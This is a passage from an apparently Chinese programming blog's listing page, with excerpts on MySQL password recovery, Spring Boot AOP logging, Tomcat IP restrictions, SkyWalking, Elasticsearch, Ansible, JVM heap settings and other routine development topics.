1. 重启 MySQL 服务器 打开 系统偏好设置 - MySQL ，然后点击 Stop MySQL Server 关闭 MySQL 服务器。 关闭 MySQL 服务器后打开终端，输入以下命令进入 MySQL 目录。 cd /usr/local/mysql/bin 再输入以下命令获取权限。 sudo su 然后输入以下命令重启 MySQL 服务器。 ./mysqld_safe --skip-grant-tables &amp; 2. 修改 MySQL 密码 刚才的终端不要关掉，按下 command + N 另开一个终端窗口，输入以下命令配置短命令。 alias mysql=/usr/local/mysql/bin/mysql 接着输入以下命令进入 MySQL 命令模式。 mysql 再输入以下命令进入 MySQL 数据库。 use mysql 然后输入以下命令获取权限。 flush privileges; 现在可以输入以下命令修改你的 MySQL 密码了，xxx 处填写你的新密码。 set password for 'root'@'localhost'=password('xxx'); 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/180ed49924f620a4834727122bc2f842/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2bb886dd80e0d419898d08ac4906e80/" rel="bookmark">
			Spring boot实现AOP记录操作日志
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在实际的项目中，特别是管理系统中，对于那些重要的操作我们通常都会记录操作日志。比如对数据库的CRUD操作，我们都会对每一次重要的操作进行记录，通常的做法是向数据库指定的日志表中插入一条记录。这里就产生了一个问题，难道要我们每次在 CRUD的时候都手动的插入日志记录吗？这肯定是不合适的，这样的操作无疑是加大了开发量，而且不易维护，所以实际项目中总是利用AOP(Aspect Oriented Programming)即面向切面编程这一技术来记录系统中的操作日志。
日志分类 这里我把日志按照面向的对象不同分为两类：
面向用户的日志：用户是指使用系统的人，这一类日志通常记录在数据库里边，并且通常是记录对数据库的一些CRUD操作。面向开发者的日志：查看这一类日志的一般都是开发人员，这类日志通常保存在文件或者在控制台打印（开发的时候在控制台，项目上线之后之后保存在文件中），这一类日志主要用于开发者开发时期和后期维护时期定位错误。 面向不同对象的日志，我们采用不同的策略去记录。很容易看出，对于面向用户的日志具有很强的灵活性，需要开发者控制用户的哪些操作需要向数据库记录日志，所以这一类保存在数据库的日志我们在使用 AOP记录时用自定义注解的方式去匹配；而面向开发者的日志我们则使用表达式去匹配就可以了（这里有可能叙述的有点模糊，看了下面去案例将会很清晰），下面分别介绍两种日志的实现。
实现AOP记录面向用户的日志 接下来分步骤介绍Spring boot中怎样实现通过AOP记录操作日志。
添加依赖 在pom.xml文件中添加如下依赖：
&lt;!-- aop依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt; &lt;/dependency&gt; 修改配置文件 在项目的application.properties文件中添加下面一句配置：
spring.aop.auto=true 这里特别说明下，这句话不加其实也可以，因为默认就是true，只要我们在pom.xml中添加了依赖就可以了，这里提出来是让大家知道有这个有这个配置。
自定义注解 上边介绍过了了，因为这类日志比较灵活，所以我们需要自定义一个注解，使用的时候在需要记录日志的方法上添加这个注解就可以了，首先在启动类的同级包下边新建一个config包，在这个报下边新建new一个名为Log的Annotation文件，文件内容如下：
package com.web.springbootaoplog.config; import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; /** * @author Promise * @createTime 2018年12月18日 下午9:26:25 * @description 定义一个方法级别的@log注解 */ @Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) public @interface Log { String value() default ""; } 这里用到的是Java元注解的相关知识，不清楚相关概念的朋友可以去这get一下【传送门】。
准备数据库日志表以及实体类，sql接口，xml文件 既然是向数据库中插入记录，那么前提是需要创建一张记录日志的表，下面给出我的表sql,由于是写样例，我这里这张表设计的很简单，大家可以自行设计。
CREATE TABLE `sys_log` ( `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键', `user_id` int(11) NOT NULL COMMENT '操作员id', `user_action` varchar(255) NOT NULL COMMENT '用户操作', `create_time` datetime DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '创建时间', PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='日志记录表'; 当然还需要创建service接口文件以及接口实现类，这里直接给出代码：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2bb886dd80e0d419898d08ac4906e80/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb6c119e2b61741201733519ff9a781a/" rel="bookmark">
			tomcat限制IP访问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 tomcat可以通过增加配置，来对来源ip进行限制，即只允许某些ip访问或禁止某些来源ip访问。
配置路径：server.xml 文件下 标签下。与同级
&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="192.168.x.x" deny="" /&gt; 此处标签尽量通过复制同级标签后修改进行，因为使用的是Valve，而不是Value，防止手敲导致错误
allow：允许访问的ip，支持正则表达
deny：拒绝访问的ip，支持正则表达
当有多个IP需要进行限制时，使用"|"来进行分隔
如果需要对来源机器名称进行限制，则需要使用到以下标签。具体内容配置与RemoteAddrValve相同
&lt;Valve className="org.apache.catalina.valves.RemoteHostValve" allow="master1" deny=""/&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a540407d0c816c0ce590ce44ca56f07/" rel="bookmark">
			echarts图表中Y(y)轴间距固定，等间距，刻度固定，设置最大值、最小值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		echarts图表中Y(y)轴间距固定，等间距，刻度固定，设置最大值、最小值
正确的写法interval: 2.5指定刻度间隔,我的间距2.5 、5、7.5、10、12.5,所以需要改成这种。如果你是 yAxis: { name: '退款率%', type: 'value', min: 2.5, max: 12.5, interval: 2.5 // 指定刻度间隔 }, 如果你是从最小0开始，到最大值100，间距为20，则可以设置成以下写法 yAxis: { name: '退款率%', type: 'value', min: 0, max: 100, interval: 20 // 指定刻度间隔 }, 以下是我刚开始的写法，是错误写法哦。 以为设置最小值和最大值就可以了，但其实不然。
yAxis: { name: '退款率%', type: 'value', min: 2.5, max: 12.5 }, 后面查完之后又改成这种的，但也不对,注意这是不对的，避免踩坑
yAxis: { name: '退款率%', type: 'value', min: 2.5, max: 12.5, boundaryGap: [0, 0.01], axisTick: { show: true, // 显示刻度 interval: 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a540407d0c816c0ce590ce44ca56f07/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2d19c9a684ca75baddf95a6cdcc8937/" rel="bookmark">
			C&#43;&#43;执行程序计时函数详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 通常计时函数主要有两个，分别是getTickCount()和getTickFrequency().
getTickCount()函数，返回的是CPU自某个时间（如启动电脑）以来走过的时钟周期数；getTickFrequency()函数，返回的是CPU一秒钟所走的时钟周期数，这样我们就可以轻松的以秒为单位对某运算进行计时； 将两个函数组合起来使用的示例如下所示：
double time0=static_cast&lt;double&gt;(getTickCount()); //进行一系列例如图像处理的操作 time0 = ((double)getTickCount()-time0)/getTickFrequency(); cout&lt;&lt;"运行时间："&lt;&lt;time0&lt;&lt;"秒"&lt;&lt;endl; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bafb65d964d9d50bfc6d8c1a288bc14c/" rel="bookmark">
			ubuntu Pdf转图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载自
https://blog.csdn.net/yang1070/article/details/127263469
将 input.pdf 转换为 PNG 图文件
pdftoppm -png input.pdf output
输出的图片文件就会指定的文件名前缀，加上页码，也就是 output-01.png、output-02.png 等。
若要将 PDF 文件转换为 JPEG 图片文件，可加上 -jpeg 参数：
将 input.pdf 转换为 jpeg 图文件
pdftoppm -jpeg input.pdf output
若要将 PDF 文件转换为 TIFF 图片文件，可加上 -tiff 参数：
将 input.pdf 转换为 TIFF 图文件
pdftoppm -tiff input.pdf output
指定转换页数
若要指定转换的页数，可以使用 -f 与 -l 参数分别指定开始与结束的页码：
将 input.pdf 的第 5 页至第 8 页转换为 PNG 图文件
pdftoppm -png -f 5 -l 8 input.pdf output
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bafb65d964d9d50bfc6d8c1a288bc14c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f650af917c9e9858314115105138d841/" rel="bookmark">
			分布式链路追踪之SkyWalking详解和实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SkyWalking 文章目录 SkyWalking1.SkyWalking概述2.SkyWalking架构设计3.SkyWalking部署4.应用程序接入SkyWalking5.SkyWalking配置应用告警5.1.告警规则5.2.Webhook（网络钩子）5.3.邮件告警实践 6.项目自动化部署接入SkyWalking6.1 整体思路6.2 启动参数修改6.3 上传agent组件到服务器6.4 修改jenkins中的项目配置 1.SkyWalking概述 2015年由个人吴晟（华为开发者）主导开源，作者是华为开发云监控产品经理，主导监控产品的规划、技术路线及相关研发工作，也是OpenTracing分布式追踪标准组织成员 ，该项目 2017年加入Apache孵化器，是一个分布式系统的应用程序性能监控工具（APM），专为微服务、云原生架构和基于容器（Docker、K8s、Mesos）架构而设计。
官方站点：http://skywalking.apache.org/
GitHub项目地址：https://github.com/apache/skywalking
其核心功能要点如下：
指标分析：服务，实例，端点指标分析问题分析：在运行时分析代码，找到问题的根本原因服务拓扑：提供服务的拓扑图分析依赖分析：服务实例和端点依赖性分析服务检测：检测慢速的服务和端点性能优化：根据服务监控的结果提供性能优化的思路链路追踪：分布式跟踪和上下文传播数据库监控：数据库访问指标监控统计，检测慢速数据库访问语句（包括SQL语句）服务告警：服务告警功能 名词解释：
服务（service）：业务资源应用系统端点（endpoint）：应用系统对外暴露的功能接口实例（instance）：物理机 2.SkyWalking架构设计 SkyWalking的整体架构设计如下图所示：
SkyWalking整体可分为：客户端，服务端
客户端：agent组件
​ 基于探针技术采集服务相关信息（包括跟踪数据和统计数据），然后将采集到的数据上报给Skywalking的数据收集器
服务端：又分为OAP，Storage，WebUI
OAP：observability analysis platform可观测性分析平台，负责接收客户端上报的数据，对数据进行分析，聚合，计算后将数据进行存储，并且还会提供一些查询API进行数据的查询，这个模块其实就是我们所说的链路追踪系统的Collector收集器
Storage：skyWalking的存储介质，默认是采用H2，同时支持许多其他的存储介质，比如：ElastaticSearch，mysql等
WebUI：提供一些图形化界面展示对应的跟踪数据，指标数据等等
SkyWalking采用组件式开发，易于扩展，主要组件作用如下：
Skywalking Agent：链路数据采集tracing（调用链数据）和metric（指标）信息并上报，上报通过HTTP或者gRPC方式发送数据到Skywalking Collector。Skywalking Collector ： 链路数据收集器，对agent传过来的tracing和metric数据进行整合分析通过Analysis Core模块处理并落入相关的数据存储中，同时会通过Query Core模块进行二次统计和监控告警。Storage： Skywalking的存储，支持以ElasticSearch、Mysql、TiDB、H2等主流存储作为存储介质进行数据存储，H2仅作为临时演示单机用，目前生产测试环境使用的是ES存储。SkyWalking UI： Web可视化平台，用来展示落地的数据。 不修改原有项目一行代码就可以进行集成，SkyWalking 以前也将这种说法放在 README 文档中,实际上这种说法是既对又错的。对于最终用户来说是对的，他们不需要修改代码(至少在绝大多数情况下)。 但这种说法也是错的， 因为代码实际上还是被修改了，只是被代理给修改了，这种做法通常叫做“在运行时操作代码”。底层原理就是自动打点代理利用了虚拟机提供的用于修改代码的接口来动态加入打点的代码，也就是说我们没有手动埋点，而是skywalking通过java agent进行了自动埋点，java agent这个机制我理解为一个main函数的拦截器，他提供了premain()方法来修改java类，premain字面理解就是在main函数之前，也就是说skywalking通过java agent的premain方法去执行埋点操作，从而完成自动埋点。
3.SkyWalking部署 参考资料中的docker-compose.yml
(1)安装OAP
docker拉取镜像
docker pull apache/skywalking-oap-server:latest-es6 创建容器
docker run --name skywalking -d -p 1234:1234 -p 11800:11800 -p 12800:12800 --restart always apache/skywalking-oap-server SkyWalking默认使用H2进行信息存储，但H2一旦重启数据就会丢失，因此采用ES替换H2对SkyWalking中数据信息存储，项目中已经安装了elasticsearch，可以直接使用，需要指定elasticsearch的地址,这里需要注意ES的版本
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f650af917c9e9858314115105138d841/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c422c52867e3273621c4e793c071937/" rel="bookmark">
			ElasticSearch学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一，简介 ES（elaticsearch简写）， Elasticsearch是一个开源的高扩展的分布式全文检索引擎，它可以近乎实时的存储、检索数据；本身扩展性很好，可以扩展到上百台服务器，处理PB级别的数据。
Elasticsearch是使用Java编写并基于Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。
二，ES搜索引擎原理 索引和分片 在ES中，所有的数据都被存储在称为索引的数据结构中，一个索引可以包含多个文档。而的文档的类型需要在创建索引时指定。ES还对每个索引进行了分片，每个分片都被存储在集群中的不同节点上，这样可以提高数据的可用性和查询效率。
索引和文档关系 参考：https://blog.csdn.net/liuwenqiang1314/article/details/125668175
ES数据结构和MySQL对应 ES数据结构中的索引和表的概念类似于MySQL，但ES的索引是面向文档的，而MySQL的表是面向行的。此外，ES的数据存储和检索采用了倒排索引，而MySQL则是使用了B+树。
ES中有几个基本概念：索引(index)、类型(type)、文档(document)、映射(mapping)等。我们将这几个概念与传统的关系型数据库中的库、表、行、列等概念进行对比，如下表：
映射 在ES中，每个索引都有一个映射，用来定义文档中每个字段的类型，以及如何存储和索引数据。映射定义了索引中可以存储哪些数据类型，以及每个类型的存储方式和搜索方式。
搜索 在ES中，搜索请求被发送到集群中的一个节点（称为协调节点或负载均衡节点)。这个节点将请求发送到包含索引分片的节点。每个节点都会返回匹配搜索条件的文档，并将结果返回给协调节点，协调节点将所有结果汇总后返回给客户端。
倒排索引 计算机索引程序通过扫描文章中的每一个词，对每一个词建立一个索引，指明该词在文章中出现的次数和位置，当用户查询时，检索程序就根据事先建立的索引进行查找，并将查找的结果反馈给用户的检索方式。这种建立索引的方式叫倒排索引。
在搜索引擎中，每个文档都有一个对应的文档ID，文档内容被表示为一系列关键字的集合。例如，文档1经过分词，提取了20个关键字，每个关键字都会记录它在文档中出现的次数和出现位置。
然后，倒排索引就是关键字到文档 ID的映射，每个关键字都对应着一段的文件，这些文件中都出现了关键字。
倒排索引的两个重要细节：
倒排索引中的所有词项对应一个或多个文档；倒排索引中的词项根据字典顺序升序排列 一篇很好的讲倒排索引的文章：ES之倒排索引详解
三，Java中ElasticSearch的查询 参考文章：Java中ElasticSearch的各种查询（普通，模糊，前缀，高亮，聚合，范围）
全文参考文章：
ES基本概念和原理简单介绍
ES搜索引擎
ES搜索引擎原理
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e292bdda953e98d33aa36d0612d963cc/" rel="bookmark">
			Easy Excel工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import com.alibaba.excel.EasyExcel; import com.alibaba.excel.ExcelWriter; import com.alibaba.excel.write.handler.WriteHandler; import com.alibaba.excel.write.metadata.WriteSheet; import com.alibaba.excel.write.metadata.style.WriteCellStyle; import com.alibaba.excel.write.style.HorizontalCellStyleStrategy; import com.alibaba.excel.write.style.column.LongestMatchColumnWidthStyleStrategy; import org.apache.poi.ss.usermodel.BorderStyle; import org.apache.poi.ss.usermodel.HorizontalAlignment; import org.apache.poi.ss.usermodel.IndexedColors; import org.apache.poi.ss.usermodel.VerticalAlignment; import org.springframework.core.io.ClassPathResource; import javax.servlet.http.HttpServletResponse; import java.io.BufferedOutputStream; import java.io.IOException; import java.net.URLEncoder; import java.util.List; import java.util.Map; /** * EasyExcel工具类 * * @author axue */ public class EasyExcelUtil { /** * 文件下载 * * &lt;p&gt; * 1. 创建excel对应的实体对象 参照{@link Class&lt;&gt;} * &lt;p&gt; * 2. 设置返回的 参数 * &lt;p&gt; * 3. 直接写，这里注意，finish的时候会自动关闭OutputStream,当然你外面再关闭流问题不大 * * @param response response * @param exportFileName 文件名稱 * @param sheetName 表名称 * @param clazz 表头模板 * @param list 数据 * @throws IOException IOException */ public static void writeWeb(HttpServletResponse response, String exportFileName, String sheetName, Class&lt;?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e292bdda953e98d33aa36d0612d963cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60bfad9ad06aeeb1e1dd4698693693ad/" rel="bookmark">
			Word论文中关于章、节、图、表、公式自动编号及引用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 章、节自动编号
2. 图、表自动编号及引用
3. 公式自动编号及引用
4. 参考文献自动编号及引用
【说明】本博客为引用内容，在此说明，具体内容参考：Word论文中关于章、节、图、表、公式自动编号及引用_word引用章节编号_YHCANDOU的博客-CSDN博客
1. 章、节自动编号 首先定义新的列表样式
可以对定义的样式重新命名（如：自动编号），找到格式----&gt;编号，进行编号设置
之后就是定义编号的级别，与对应的标题进行链接（如级别1-----标题1,、级别2------标题2等），从而实现章、节的编号
注意：在如果想要设置为第一章，而不是第1章，需要在级别1以下，将正规形式编号打钩，具体如何更改将在后面介绍。
对于每个级别可以设置标题的字体、缩进等情况，根据要求进行设置即可，这里不再介绍。设置完成确定后，就可以对章节进行自动编号
2. 图、表自动编号及引用 一般来说，图、表都是按章标号（按节标号类似），找到引用-------插入题注
选择需要插入图还是表，这里以图为例（表类似），
选择编号，进行图与标题的链接，这里是按章标号（按节标号连接到对应的标题即可）
选择引用-------插入题注，就可以实现图的自动编号
引用的时候，选择引用-------交叉引用，选择引用的类型即可（章、节、图、表类似）
引用效果如下
注意，如果章节标题一开始为第一章，那么此时的图、表的引用就会变成“一.1，一.2”等，所以刚开始设置的为第1章，也是为了后续引用图表的方便，在所有图、表引用完成后再更改对应的图、表，具体如下 Ctrl + F11锁定域后，修改标题1的编号格式，选择对应的格式即可 更新域（F9）或者全选右键更新域即可，最终的效果如下
Ctrl + Shift + F11可以解除锁定，此时更新域后，就会编号就会变成与标题1相同的形式，即“一.1，一.2”等
当然可以修改标题1的编号格式， 重新更新域就可以恢复了，这里就不再叙述 3. 公式自动编号及引用 关于公式的自动编号和引用还是推荐mathtype，会比较方便一点
选择插入编号----格式化，可以看到预览的效果，这里还是给出按章编号
选择右编号进行公式右对齐，在新的一章选择插入下一章分隔符，就可以实现下一章的公式编号
具体效果为
引用的时候也很方便，通过mathtype插入引用选项，点击需要引用的公式即可实现自动引用。
当然也可以使用Word自动编号，比如可以设置表格，对其进行输入公式和设置自动编号等等，这里就不再介绍。
4. 参考文献自动编号及引用 关于参考文献的自动编号及引用，请参考Word参考文献自动编号这篇文章，这里就不再叙述。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1d1941febcb2e815a9c673224769851/" rel="bookmark">
			图像预处理——CV
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
1.图像预处理
1.1 图像显示与存储原理
1.2 图像增强的目标
1.3 点运算：基于直方图的对比度增强
1.4 形态学处理
1.5 空间域处理：卷积
1.6 卷积的应用（平滑、边缘检测、锐化等）
1.7 频率域处理：傅里叶变换、小波变换
1.图像预处理 1.1 图像显示与存储原理 加法混色：越叠加越亮
HSV和RGB之间可以相互转换。
1.2 图像增强的目标 1.3 点运算：基于直方图的对比度增强 1.4 形态学处理 左-&gt;右：腐蚀。 右-&gt;左：膨胀。
1.5 空间域处理：卷积 常用的是补零的方式。 尽量避免用一个很大的卷积核卷积一个很小的图片。
1.6 卷积的应用（平滑、边缘检测、锐化等） 空加除以总个数。
中值滤波比均值滤波效果好。
椒盐噪声是一种常见的数字图像噪声形式，也称为脉冲噪声。它得名于其视觉效果类似于在图像中添加了一些黑色和白色的椒盐颗粒。
1.7 频率域处理：傅里叶变换、小波变换 1.2 图像特征及描述 X方向高斯梯度：就把横方向的边缘找出来。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6d1d8d0096d3a3fde861e9faabda97a/" rel="bookmark">
			uniapp使用命令创建页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package.js下创建命令
"scripts": { "add": "node ./auto/addPage.ts" } package.js同级目录创建auto/addPage.ts
addPage.ts代码如下
const fs = require('fs') const path = require('path') const targetPath = process.argv[2];// 要创建的目录地址和文件名 const args = targetPath.split('/'); const targetParent = args.slice(-2, -1)[0]; //创建路径的父文件夹 const targetName = args.slice(-1)[0]; //创建的文件名 const targetFileName = process.argv[3]; // 要创建的文件中文名 const root = process.argv[4]; // 要创建的文件中文名 let targetFullParentPath, targetFullPath; if (root) { targetFullParentPath = `./src/${root}/` + targetParent; //完整的父文件夹路径 targetFullPath = `./src/${root}/` + targetPath + '.nvue'; //完整的文件路径 } else { targetFullParentPath = '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c6d1d8d0096d3a3fde861e9faabda97a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e918bec18b3f0b0fa47f78d2b4ad0d2/" rel="bookmark">
			通过Java代码获取接口响应数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你好呀！我是小易同学，一名普通的不能再普通的学习者。
写文章是为了记录自己的学习过程，同时也希望能帮助到需要的人。
如果我的文章对您有帮助，请不要忘记关注我哦🥰
一、目标 已知
接口地址1：https://X1X1X1 请求方式：Post 接口地址2：https://X2X2X2 请求方式：Get 从以上两个接口地址分别获取到响应数据，两个接口地址对应两种请求方式
二、Post接口详细步骤 1.将请求地址定义为常量 2.构建请求头，将Token添加到Authorization字段中（当有token时才添加） 3.构建请求参 4.发送POST请求 5.获取响应数据，并将要获取的规律数据转换为Map格式 ，将数据存入对象中 部分代码：
//构建请求头，将Token添加到Authorization字段中 HttpHeaders headers = new HttpHeaders(); headers.add("Content-Type", "application/json"); headers.set("Authorization", "Bearer " + token); headers.setContentType(MediaType.APPLICATION_JSON); // 构建请求参 Map&lt;String, Object&gt; queryParams = new HashMap&lt;&gt;(); queryParams.put("startTime", dateMap.get("startTime")); queryParams.put("endTime", dateMap.get("endTime")); // 发送POST请求 String requestUrl = JOB_API_URL; RestTemplate restTemplate = new RestTemplate(); HttpEntity&lt;Map&lt;String, Object&gt;&gt; objectHttpEntity = new HttpEntity&lt;&gt;(queryParams, headers); ResponseEntity&lt;Map&gt; responseEntity = restTemplate.postForEntity(requestUrl, objectHttpEntity, Map.class); 三、Get接口详细步骤 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e918bec18b3f0b0fa47f78d2b4ad0d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b10dddeddbc5d47879f8bcc2a59486b/" rel="bookmark">
			SpringBoot整合人大金仓（kingbase8）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 因客户要求使用人大金仓数据库，因此最近在java适配人大金仓数据库，在此做下笔记，此为第三步，SpringBoot整合人大金仓（kingbase8） 1.创建与模式对应用户，所用模式为test-demo，但是模式中-命名使用模式查询时存在问题，我修改模式为test_demo，则我创建的用户为test_demo，然后根据需要设置权限 ![在这里插入图片描述](https://img-blog.csdnimg.cn/c06351884e2049faba4e1e00f98b9f04.png![在这里插入图片描述](https://img-blog.csdnimg.cn/a74c6b575c964c20b421244c6844450d.png
2.引入kingbase8的jar上传到本地maven，可到Kingbase安装目录对应路径下寻找，我的位置在D:\Kingbase\ES\V8\KESRealPro\V008R006C007B0012\Interface\jdbc，使用Maven的命令进行安装 mvn install:install-file -DgroupId=com.kingbase8 -DartifactId=kingbase8 -Dversion=8.6.0 -Dpackaging=jar -Dfile=D:\Kingbase\ES\V8\KESRealPro\V008R006C007B0012\Interface\jdbc\kingbase8-8.6.0.jar 3.引入pom依赖 &lt;dependency&gt; &lt;groupId&gt;com.kingbase&lt;/groupId&gt; &lt;artifactId&gt;kingbase8&lt;/artifactId&gt; &lt;version&gt;8.6.0&lt;/version&gt; &lt;/dependency&gt; 4.编写配置文件 spring.datasource.url=jdbc:kingbase8://127.0.0.1:54321/hhh-system spring.datasource.username=test_demo spring.datasource.password=123456 spring.datasource.driver-class-name=com.kingbase8.Driver 该用户需为你前面指定对应模式的用户，如果用其他模式的用户则找不到对应表，管理员账号的话需指定模式，不然的话会报关系不存在
mybatis-plus.global-config.db-config.schema=test_demo 5.测试能否正常启动 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfc6c90fe4d58129e49ecb963f9c2bc4/" rel="bookmark">
			Ansible的安装和配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装和配置 Ansible
安装所需的软件包
创建名为 /home/greg/ansible/inventory 的静态清单文件，以满足以下要求：
172.25.250.9 是 dev 主机组的成员
172.25.250.10 是 test 主机组的成员
172.25.250.11 和 172.25.250.12 是 prod 主机组的成员
172.25.250.13 是 balancers 主机组的成员
prod 组是 webservers 主机组的成员
创建名为 /home/greg/ansible/ansible.cfg 的配置文件，以满足以下要求：
主机清单文件为 /home/greg/ansible/inventory
playbook 中使用的角色的位置包括 /home/greg/ansible/roles
根据上面要求我们应该正常安装ansible,命令如下：
sudo dnf install ansible -y
创建一个专门存放和运行ansible的文件夹
mkdir ansible
进入文件夹内开始时配置清单文件
vim /home/greg/ansible /inventory
配置完清单文件后，修改ansible的配置文件
cp /etc/ansible/ansible.cfg /home/greg/ansible/ansible.cfg
vim ansible.cfg
修改成如下即可
[defaults]
inventory = /home/greg/ansible/inventory
roles_path = /home/greg/ansible/roles
host_key_checking = False
此时我们可以运行清单文件查看一下：
ansible-inventory --graph
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfc6c90fe4d58129e49ecb963f9c2bc4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89d2933c7ad910473b5844bf9b0aba61/" rel="bookmark">
			java heap space解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在JVM中如果98%的时间是用于GC(Garbage Collection)且可用的 Heap size 不足2%的时候将抛出异常信息，java.lang.OutOfMemoryError: Java heap space。
所以产生这个异样的原因通常有两种：
1.程序中出现了死循环2.程序占用内存太多，超过了JVM堆设置的最大值。 对于第一种情况，需要自己查看程序代码，这里不再多说。
第二种情况，我们手工扩大JVM堆的参数设置。JVM堆的设置是指java程序运行过程中JVM可以调配使用的内存空间的设置。在JVM启动时，JVM堆会自动设置heap size值。通常情况下，初始空间（即-Xms）默认值是物理内存的1/64，最大空间是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置。这里对各个参数的意义解释一下：
-Xms：初始值-Xmx：最大值-Xmn：最小值 Heap Size的设置不宜太小，也不宜太大。若设置太小程序的响应速度会变慢了，因为GC占用了更多的时间，而应用分配到的执行时间较少。太大也会造成空间的浪费，而且也会影响其他程序的正常运行。Heap Size 最大最好不要超过可用物理内存的80％。建议将-Xms和-Xmx选项设置为相同，而-Xmn为1/4的-Xmx值。
设置的方法主要有以下几个：
1.就是在执行JAVA类文件时加上这个参数，其中className是需要执行的确类名。（包括包名）如：java -Xms32m -Xmx800m className 这个不仅解决问题了，而且执行的速度比没有设置的时候快很多。如果是开发测试，也可以再eclipse中直接设置。Eclipse -&gt;run -arguments 中的VM arguments 中输入-Xms32m -Xmx800m这个参数就可以了。2.可以在windows更改系统环境变量加上JAVA_OPTS=-Xms64m -Xmx512m。3.如果用的tomcat,在windows下,可以在C:\tomcat5.5.9\bin\catalina.bat（具体路径根据自己tomcat的位置而定） 中加上:set JAVA_OPTS=-Xms64m -Xmx256m （大小依自己内存而定）位置在: rem Guess CATALINA_HOME if not defined 这行的下面加合适.4.如果是linux系统Linux 在{tomcat_home}/bin/catalina.sh的前面，加 set JAVA_OPTS=’-Xms64 -Xmx512’ 因为程序要从数据读取近10W行记录处理，当读到9W的时候就出现 java.lang.OutOfMemoryError: Java heap space 这样的错误。
在网上一查可能是JAVA的堆栈设置太小的原因。
跟据网上的答案大致有这两种解决方法：
1、设置环境变量
set JAVA_OPTS= -Xms32m -Xmx512m
可以根据自己机器的内存进行更改,但本人测试这种方法并没有解决问题。可能是还有哪里需要设置。
2、java -Xms32m -Xmx800m className
就是在执行JAVA类文件时加上这个参数，其中className是需要执行的确类名。（包括包名）
这个解决问题了。而且执行的速度比没有设置的时候快很多。
如果在测试的时候可能会用Eclispe 这时候就需要在Eclipse -&gt;run -arguments 中的VM arguments 中输入-Xms32m -Xmx800m这个参数就可以了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89d2933c7ad910473b5844bf9b0aba61/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
